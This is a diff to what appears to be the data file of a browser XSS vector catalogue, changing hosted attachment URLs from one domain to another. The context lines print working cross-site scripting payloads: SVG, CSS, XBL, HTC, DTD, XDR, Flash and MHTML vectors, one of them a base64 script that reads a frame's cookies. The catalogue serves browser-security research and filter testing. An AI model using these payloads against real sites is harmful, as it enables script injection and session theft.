@@ -1484,7 +1484,7 @@ var items =
         'attachment' : {
             'required_mime' : 'image/svg+xml',
             'crossdomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/font.svg',
+            'path'          : 'http://html5sec.org/font.svg',
             'name'          : 'font.svg',
             'raw'           : '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%js_alert%" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>'
         },
@@ -1523,7 +1523,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.css',
+            'path'          : 'http://html5sec.org/test.css',
             'name'          : 'test.css',
             'raw'           : '* {-o-link:\'%js_uri_alert%\';-o-link-source: current;}'
         },
@@ -1838,7 +1838,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/test.htc',
+            'path'          : 'http://html5sec.org/test.htc',
             'name'          : 'test.htc',
             'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
         },        
@@ -2111,7 +2111,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/test.xbl',
+            'path'          : 'http://html5sec.org/test.xbl',
             'name'          : 'test.xbl',
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
@@ -2525,7 +2525,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/event.php',
+            'path'          : 'http://html5sec.org/event.php',
             'name'          : 'event.php',
             'raw'           : '<?php\r\nheader("Content-Type: application/x-dom-event-stream");\r\ndie("Event: load\\ndata: \\n\\n");\r\n?>'
         },
@@ -2628,7 +2628,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.dtd',
+            'path'          : 'http://html5sec.org/test.dtd',
             'name'          : 'test.dtd',
             'raw'           : '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'%js_alert%\'/&#x3E;">'
         },
@@ -2699,7 +2699,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.xdr',
+            'path'          : 'http://html5sec.org/test.xdr',
             'name'          : 'test.xdr',
             'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
         },
@@ -2745,7 +2745,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.swf',
+            'path'          : 'http://html5sec.org/test.swf',
             'name'          : 'test.swf',
             'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest("javascript:alert(1);"),"_top");\r\n}}'
         },        
@@ -2940,7 +2940,7 @@ var items =
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.evt',
+            'path'          : 'http://html5sec.org/test.evt',
             'name'          : 'test.evt',
             'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml" id="x">%js_alert%</script>'
         },
@@ -3114,7 +3114,7 @@ var items =
         'attachment' : {
             'required_mime' : 'image/svg+xml',
             'crossdomain'    : '0',            
-            'path'          : 'http://heideri.ch/jso/test2.svg',
+            'path'          : 'http://html5sec.org/test2.svg',
             'name'          : 'test2.svg',
             'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%"><input value="XXX" type="submit"/></form>'
         },
@@ -3313,11 +3313,11 @@ var items =
             'cs' : 'Spuštění JavaScriptu skrz MHTML schema',
             'de' : ''
         },
-        'data'       : 'mhtml:http://heideri.ch/jso/test.html!xss.html\nmhtml:http://heideri.ch/jso/test.gif!xss.html',
+        'data'       : 'mhtml:http://html5sec.org/test.html!xss.html\nmhtml:http://html5sec.org/test.gif!xss.html',
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.html',
+            'path'          : 'http://html5sec.org/test.html',
             'name'          : 'test.html',
             'raw'           : '<html>\n<body>\n<b>some content without two new line \\n\\n</b>\nContent-Type: multipart/related; boundary="******"<b>some content without two new line</b>\n--******\nContent-Location: xss.html\nContent-Transfer-Encoding: base64\n\nPGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1\ncmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9\ndXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy\nYW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg\n--\n</body>\n</html>'
         },
@@ -3753,7 +3753,7 @@ var items =
         'attachment' : {
             'required_mime' : 'image/svg+xml',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test3.svg',
+            'path'          : 'http://html5sec.org/test3.svg',
             'name'          : 'test3.svg',
             'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<clipPath id="a" >\n<set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" />\n</clipPath>\n\n<pattern id="b">\n<set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" />\n</pattern>\n\n<filter id="c">\n<set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" />\n</filter>\n\n<marker id="d">\n<set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(4)" />\n</marker>\n\n<mask id="e">\n<set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(5)" />\n</mask>\n\n<linearGradient id="f">\n<set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(6)" />\n</linearGradient>\n\n</svg>'
         },
@@ -3792,7 +3792,7 @@ var items =
         'attachment' : {
             'required_mime' : 'image/svg+xml',
             'crossdomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test4.svg',
+            'path'          : 'http://html5sec.org/test4.svg',
             'name'          : 'test4.svg',
             'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<marker id="a"  markerWidth="1000" markerHeight="1000" refX="0" refY="0">\n<a xlink:href="http://google.com">\n<set attributeName="xlink:href" to="javascript:alert(1)" begin="1s" />\n<rect width="1000" height="1000" fill="white"/>\n</a>\n</marker>\n</svg>'
         },
